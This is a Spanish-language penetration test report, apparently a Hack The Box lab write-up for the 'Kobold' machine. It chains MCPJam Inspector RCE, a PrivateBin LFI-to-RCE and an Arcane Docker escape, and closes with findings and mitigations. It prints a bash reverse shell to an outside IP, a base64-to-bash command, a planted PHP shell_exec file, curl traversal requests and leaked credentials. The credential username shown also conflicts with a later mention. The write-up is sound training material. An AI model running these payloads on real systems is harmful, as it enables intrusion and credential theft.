Informe de Evaluacion de Penetracion: Kobold.HTB
#

1. Introduccion
#

El presente informe documenta la evaluacion de penetracion realizada contra la maquina Kobold de la plataforma Hack The Box. El objetivo fue obtener acceso completo al sistema mediante la explotacion ordenada de vulnerabilidades reales, documentando cada fase con pruebas de concepto, capturas de pantalla y recomendaciones de mitigacion.

Este informe sigue una metodologia alineada con el estandar OSCP (Offensive Security Certified Professional), adaptada al idioma espanol para facilitar su comprension.

2. Objetivo
#

  • Obtener el archivo user.txt (compromiso de usuario regular).
  • Obtener el archivo root.txt (compromiso total del sistema / administrador).
  • Documentar la cadena de ataque completa con evidencia tecnica.

4. Resumen Ejecutivo de Alto Nivel
#

Durante la evaluacion se identificaron multiples vectores de ataque encadenados que permitieron el compromiso total del sistema. La cadena inicio con un RCE no autenticado en la herramienta MCPJam Inspector (CVE-2026-23744), seguido de una exfiltracion de credenciales mediante LFI en PrivateBin (CVE-2025-64714), y culmino con un escape de contenedor Docker abusando la API de gestion Arcane v1.13.0.

#

Recomendaciones Generales
#

  1. Actualizar MCPJam Inspector a una version superior a 1.4.2 o restringir el acceso a la red interna.
  2. Deshabilitar templateselection en PrivateBin (cfg/conf.php) o actualizar a v2.0.3+.
  3. No reutilizar contrasenas entre servicios (PrivateBin MySQL != Arcane admin).
  4. Implementar autenticacion robusta en Arcane y validar permisos de creacion de contenedores.
  5. Restringir la exposicion de Arcane (puerto 3552) a interfaces de red internas o VPN.
  6. Auditar permisos del grupo operator sobre /privatebin-data/ y limitar a solo lectura si no requiere escritura.

5. Metodologia
#

Se adopto el enfoque estandar de pruebas de penetracion:

  1. Recopilacion de Informacion — Escaneo de puertos, descubrimiento de subdominios, enumeracion de servicios.
  2. Enumeracion de Servicios — Identificacion de versiones, tecnologias y configuraciones expuestas.
  3. Penetracion / Explotacion — Ataques dirigidos contra vulnerabilidades confirmadas.
  4. Escalada de Privilegios — Movimiento lateral y obtencion de acceso administrativo.
  5. Post-Explotacion — Recoleccion de evidencia y flags.

7. Explotacion
#

7.1 Initial Access — CVE-2026-23744 (MCPJam Inspector RCE)
#

Vulnerabilidad Explotada
#

CVE-2026-23744 — MCPJam Inspector <= 1.4.2 Remote Code Execution (CVSS 9.8).

El endpoint /api/mcp/connect acepta un JSON con serverConfig.command y serverConfig.args que se pasan directamente al sistema operativo sin sanitizacion ni autenticacion. El servicio escucha en 0.0.0.0:6274, accesible externamente via reverse proxy.

Prueba de Concepto
#

Se utilizo un script PoC para confirmar la vulnerabilidad y entablar una reverse shell:

rlwrap nc -lnvp 4444

./CVE-2026-23744_PoC.sh -u https://mcp.kobold.htb:443 -k \
  --cmd "printf KGJhc2ggLWkgPiY... | base64 -d | bash" \
  --callback "http://10.10.14.230:80"

Payload enviado:

{
  "serverConfig": {
    "timeout": 10000,
    "command": "bash",
    "args": ["-c", "bash -i >& /dev/tcp/10.10.14.230/4444 0>&1"],
    "env": {}
  },
  "serverId": "mymcp"
}

Respuesta del servidor:

{"success":false,"error":"Connection failed for server mymcp: MCP error -32000: Connection closed"}

La respuesta indica fallo de conexion MCP (esperado, bash no es un servidor MCP), pero el comando se ejecuto en el host.

7.2 Escalada de Privilegios — Ruta Intencionada (PrivateBin LFI + Arcane)
#

Paso A: Descubrimiento de Servicios Internos como ben
#

Tras obtener la shell como ben via CVE-2026-23744, se realizo enumeracion local para identificar servicios adicionales no visibles desde la red externa:

ben@kobold:~$ ss -tulnp

Servicios internos identificados:

PuertoDireccionServicioNotas

*:3552Todas las interfacesArcane (Go binary)Expuesto a todas las interfaces, incluyendo IPv6 (*::3552)

Descubrimiento de bin.kobold.htb:

El subdominio bin.kobold.htb no fue identificado durante el vhost fuzzing externo. Fue descubierto tras revisar la configuracion de nginx en el sistema comprometido:

ben@kobold:~$ cat /etc/nginx/sites-enabled/bin.kobold.htb

server {
    listen 80;
    server_name bin.kobold.htb;
    return 301 https://bin.kobold.htb$request_uri;
}
server {
    listen 443 ssl;
    server_name bin.kobold.htb;
    ssl_certificate /privatebin-data/certs/cert.pem;
    ssl_certificate_key /privatebin-data/certs/key.pem;
    location / {
        proxy_pass http://127.0.0.1:8080;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
    }
}

Esta configuracion revelo:

  1. La existencia del subdominio bin.kobold.htb (no descubierto externamente).
  2. El directorio /privatebin-data/ en el host (via ssl_certificate).
  3. Que PrivateBin escucha en 127.0.0.1:8080 y es accesible solo internamente.

Analisis de permisos de /privatebin-data/:

ben@kobold:~$ ls -la /privatebin-data/

El grupo operator tiene permisos sobre /privatebin-data/. Como ben pertenece a operator (GID 37), tiene lectura y escritura sobre este directorio. Este permiso es critico: el directorio esta bind-montado dentro del contenedor PrivateBin como /srv/data/, lo cual habilita el vector LFI->RCE.

Nota sobre Arcane en *:3552:

El servicio Arcane escucha en *:3552, lo que significa que esta accesible en todas las interfaces, incluyendo IPv6 (*::3552). Aunque el puerto fue identificado en el escaneo nmap inicial, su funcion exacta (Arcane Docker Management) solo se determino tras la enumeracion local.

Paso B: CVE-2025-64714 — LFI en PrivateBin 2.0.2
#

Vulnerabilidad: PrivateBin 2.0.2 permite inclusion local de archivos (LFI) cuando templateselection = true en cfg/conf.php. La aplicacion confia en la cookie template y ejecuta include("tpl/" + cookie + ".php") sin sanitizar secuencias de path traversal.

Problema del LFI directo: Los archivos internos de PrivateBin (cfg/conf.php, datos de paste) contienen una guard clause que provoca die() si se incluyen directamente, impidiendo la lectura directa.

Solucion — RCE via volumen compartido:

El contenedor PrivateBin monta /privatebin-data/data (host) como /srv/data (contenedor). El usuario ben pertenece al grupo operator (GID 37), el cual tiene permisos de lectura y escritura sobre /privatebin-data/. Esto permite a ben escribir archivos arbitrarios en un directorio que es accesible dentro del contenedor, convirtiendo el LFI en RCE.

Confirmacion empirica del bind mount:

Antes de plantar el exploit, se confirmo que el volumen esta compartido:

ben@kobold:~$ echo "test123" > /privatebin-data/data/testfile.txt

curl -sk -b "template=../data/testfile" "https://bin.kobold.htb/"

Esto confirma que /privatebin-data/data/ del host es accesible dentro del contenedor via path traversal, y que los archivos escritos por ben son ejecutables por el LFI.

Nota sobre /tmp: El directorio /tmp del host no esta montado dentro del contenedor PrivateBin. Docker crea un /tmp aislado por contenedor. Por lo tanto, /tmp no es un vector viable para este exploit.

Paso C: Explotacion del LFI->RCE
#

ben@kobold:/privatebin-data$ printf '<?php echo shell_exec("cat /srv/cfg/conf.php"); ?>' \
  > /privatebin-data/data/bd/cfg.php

ben@kobold:/privatebin-data$ curl -sk -b "template=../data/bd/cfg" \
  "https://bin.kobold.htb/" | grep -v ';'

Explicacion tecnica del flujo:

  1. ben escribe cfg.php en /privatebin-data/data/bd/ del host (granted por GID operator).
  2. El archivo aparece instantaneamente en /srv/data/bd/cfg.php dentro del contenedor (bind mount).
  3. La peticion HTTP a bin.kobold.htb con cookie template=../data/bd/cfg fuerza a PrivateBin a ejecutar:
    include("tpl/../data/bd/cfg.php");
  4. Como cfg.php es nuestro archivo (sin guard clause), PHP lo ejecuta.
  5. El shell_exec("cat /srv/cfg/conf.php") corre como comando del sistema, leyendo el archivo como texto plano y devolviendo las credenciales.

Credenciales extraidas:

[model_options]
usr = "privatebin"
pwd = "ComplexP@sswordAdmin1928"

7.3 Analisis de la Cadena de Ataque
#

La ruta de escalada completa depende de multiples factores encadenados:

FaseRequisitoSi falla…
1. RCE MCPJamEndpoint expuesto sin authNo hay shell como ben
2. GID operatorPermisos R/W sobre /privatebin-data/No se puede plantar archivo PHP
3. Bind mount/privatebin-data/data/ -> /srv/data/El LFI sigue siendo “ciego”
4. LFI->RCECookie template sin sanitizacionNo hay exfiltracion de credenciales
5. Reutilizacion de credsMisma password en ArcaneNo hay auth en Arcane
6. Arcane expuestoPuerto 3552 en todas las interfacesNo hay panel de gestion Docker
7. Container privilegedPermiso de crear contenedores rootNo hay escape a root

El eslabon critico: El GID operator sobre /privatebin-data/ es el unico vector viable para transformar el LFI “ciego” de PrivateBin en un RCE efectivo. Sin este permiso de grupo, no hay forma de colocar un archivo PHP controlado dentro del alcance del LFI, y la guard clause de conf.php impide la lectura directa de credenciales.

Secuencia de descubrimiento interno:

Fase externa:          nmap -> 22/80/443/3552 -> vhost fuzzing -> mcp.kobold.htb
                              |
Fase interna (como ben):  ss -tulnp -> 127.0.0.1:8080 (PrivateBin)
                              |
                          cat /etc/nginx/sites-enabled/* -> bin.kobold.htb
                              |
                          ls -la /privatebin-data/ -> operator tiene R/W
                              |
                          Prueba empirica (echo "test123") -> confirmar bind mount
                              |
                          Plantar cfg.php -> LFI->RCE -> leak credenciales
                              |
                          Port fwd :3552 -> Arcane panel -> container privileged -> root

8. Hallazgos Detallados
#

Hallazgo 1: RCE no autenticado en MCPJam Inspector (CVE-2026-23744)
#

AtributoValor
SeveridadCritica
CVSS 3.19.8
CWECWE-78 (OS Command Injection)
Sistemamcp.kobold.htb (127.0.0.1:6274)
VectorRed — accesible externamente via nginx reverse proxy

Descripcion: El endpoint /api/mcp/connect no valida ni sanitiza los campos command y args del objeto serverConfig. Estos valores se pasan directamente a child_process.spawn(), permitiendo la ejecucion arbitraria de comandos del sistema operativo con los privilegios del proceso Node.js (usuario ben).

Impacto: Un atacante remoto no autenticado puede obtener ejecucion de codigo remota (RCE) y una shell interactiva en el servidor.

Recomendacion:

  • Actualizar MCPJam Inspector a una version posterior a 1.4.2.
  • Implementar validacion estricta de lista blanca sobre command y args.
  • Restringir el inspector a 127.0.0.1 si no es necesario el acceso externo.

Hallazgo 2: LFI a RCE en PrivateBin (CVE-2025-64714)
#

AtributoValor
SeveridadMedia
CVSS 3.15.8
CWECWE-23 (Path Traversal), CWE-98 (Remote File Inclusion)
Sistemabin.kobold.htb (PrivateBin 2.0.2)
Precondiciontemplateselection = true en cfg/conf.php

Descripcion: Cuando la opcion templateselection esta habilitada, PrivateBin incluye archivos PHP basandose en el valor de la cookie template, concatenando tpl/{valor}.php. Un atacante puede usar path traversal (../) para incluir archivos arbitrarios del sistema de archivos del contenedor. Si el atacante puede escribir en un directorio accesible por el servidor web (como /srv/data/ via bind mount), convierte el LFI en RCE al incluir un archivo PHP malicioso.

Impacto: Ejecucion remota de codigo dentro del contenedor PrivateBin y exfiltracion de credenciales de configuracion.

Recomendacion:

  • Actualizar a PrivateBin 2.0.3 o superior.
  • Deshabilitar templateselection estableciendo templateselection = false.
  • Sanitizar y validar la entrada de la cookie template restringiendola a una lista blanca de plantillas permitidas.

Hallazgo 3: Permisos de grupo operator sobre /privatebin-data (Habilitador de LFI->RCE)
#

AtributoValor
SeveridadAlta
CWECWE-250 (Execution with Unnecessary Privileges)
SistemaHost local (Ubuntu)

Descripcion: El usuario ben pertenece al grupo operator (GID 37). Este grupo posee permisos de lectura y escritura sobre el directorio /privatebin-data/, el cual esta bind-montado dentro del contenedor PrivateBin como /srv/data/. Un atacante con shell como ben puede escribir archivos PHP arbitrarios en /privatebin-data/data/, que luego son accesibles dentro del contenedor via LFI (CVE-2025-64714). Esto convierte un LFI “ciego” (con guard clause) en un RCE completo, permitiendo la exfiltracion de credenciales de configuracion.

Analisis de alternativas:

  • /tmp del host no esta montado en el contenedor (Docker aislado por contenedor).
  • /var/www/ no es writable por ben.
  • No hay otros volumenes compartidos identificados.
  • Por lo tanto, el acceso operator sobre /privatebin-data/ es el unico vector viable para habilitar el RCE.

Recomendacion:

  • Restringir los permisos del grupo operator sobre /privatebin-data/ a solo lectura, o aislarlo en un subdirectorio especifico.
  • Implementar controles de integridad que detecten archivos no autorizados en el volumen compartido.
  • Ejecutar el contenedor PrivateBin con un volumen de datos de solo lectura si no requiere escritura externa.

Hallazgo 4: Reutilizacion de Credenciales y Docker API sin Restricciones
#

Descripcion: Las credenciales de la base de datos MySQL de PrivateBin (arcane:ComplexP@sswordAdmin1928) fueron reutilizadas como credenciales de administrador en Arcane. Arcane permite a un administrador autenticado crear contenedores Docker arbitrarios, incluyendo contenedores privilegiados con monturas de volumen del host.

Impacto: Un atacante con credenciales de Arcane puede escalar a root completo del host montando el filesystem raiz dentro de un contenedor.

Recomendacion:

  • Utilizar contrasenas unicas y aleatorias por servicio.
  • Implementar RBAC estricto en Arcane: no permitir a administradores crear contenedores con monturas de /.
  • Ejecutar Arcane con un usuario no privilegiado y sin acceso al grupo docker.
  • Deshabilitar la creacion de contenedores privilegiados (privileged: false por defecto).

11. Conclusiones
#

La maquina Kobold demuestra una cadena de ataque realista que combina:

  1. Exposicion de herramientas de desarrollo (MCPJam Inspector) sin autenticacion.
  2. Configuracion insegura en aplicaciones web (PrivateBin templateselection).
  3. Permisos de grupo excesivos (operator con R/W sobre /privatebin-data), que habilitan el LFI->RCE.
  4. Reutilizacion de credenciales entre capas de la arquitectura (PrivateBin MySQL -> Arcane admin).
  5. Exposicion de APIs de gestion (Arcane en puerto 3552) que permiten la creacion de contenedores privilegiados.

Cada uno de estos factores, por si solo, representa un riesgo significativo. Encadenados, permiten el compromiso total del sistema en cuestion de minutos.
